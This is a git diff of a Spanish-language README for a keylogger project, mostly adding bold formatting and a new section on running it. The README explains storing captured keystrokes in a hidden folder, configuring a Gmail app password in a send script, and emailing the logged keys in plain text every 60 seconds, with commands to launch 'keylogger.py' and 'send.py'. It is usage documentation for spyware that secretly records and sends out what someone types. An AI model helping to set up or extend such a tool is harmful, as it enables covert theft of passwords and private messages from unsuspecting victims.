@@ -16,10 +16,12 @@ Para poder usar la contraseña, accede a <a href="https://myacount.google.com/ap
 <br><br>
 Copia la clave generada en el valor de la variable password del script de envío
 <br>
-Cambia el valor de "RUTA" en ambos scripts por la ruta que quieras, es recomendable usar la ruta "C:/Users/{user}/.../keys" donde {user} es el usuario del sistema, para evitar errores en la creación de la carpeta oculta por la falta de permisos
+Cambia el valor de **"RUTA"** en ambos scripts por la ruta que quieras, es recomendable usar la ruta **"C:/Users/{user}/.../keys"** donde **{user}** es el usuario del sistema, para evitar errores en la creación de la carpeta oculta por la falta de permisos
 <br>
 <img src="assets/ejemplos_ruta.png" alt="Ejemplos ruta" width="400px">
 ## Script de envío
 Cada 60 segundos se enviará el contenido del archivo keys en texto plano al correo que hayas elegido
 <br>
-Puedes cambiar la frecuencia de envío en "time.sleep(INTERVALO_EN_SEGUNDOS)"
+Puedes cambiar la frecuencia de envío en **"time.sleep(INTERVALO_EN_SEGUNDOS)"**
+## Ejecución
+Ejecuta los script con los comandos **python keylogger.py** y **python send.py** en terminales diferentes, en futuras versiones se corregirá para que las funciones se ejecuten desde el mismo script
